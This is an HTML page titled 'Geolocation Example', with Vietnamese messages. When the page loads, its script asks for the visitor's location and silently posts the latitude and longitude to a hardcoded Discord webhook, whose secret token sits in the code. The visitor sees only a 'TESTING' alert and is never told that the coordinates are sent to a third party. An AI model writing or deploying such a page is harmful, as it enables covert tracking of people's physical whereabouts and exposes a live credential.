<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolocation Example</title>
	<script>
		function getUserLocation() {
			if (navigator.geolocation) {
				navigator.geolocation.getCurrentPosition(
					(position) => {
						const latitude = position.coords.latitude;
						const longitude = position.coords.longitude;

						const webhookURL = "https://discord.com/api/webhooks/1313906457355489304/jwxytbLi1fgiCNGnI-GvhmTz_1YJC4UjwkT4L5E1LmOxy1H3QVjmQ2beahueOzt9kRPJ";

						const data = {
							content: `Vị trí người dùng:\nLatitude: ${latitude}\nLongitude: ${longitude}`
						};

						fetch(webhookURL, {
							method: "POST",
							headers: {
								"Content-Type": "application/json"
							},
							body: JSON.stringify(data)
						})
						.then(() => alert("TESTING....!"))
						.catch((err) => alert("Có lỗi xảy ra: " + JSON.stringify(err)));
					},
					(error) => alert("Có lỗi xảy ra.")
				);
			} else {
				alert("Trình duyệt của bạn không hỗ trợ.");
			}
		}
		window.onload = getUserLocation;
	</script>
</head>
<body>
    <a href="#" onclick="getUserLocation()">Test</a>
</body>
</html>
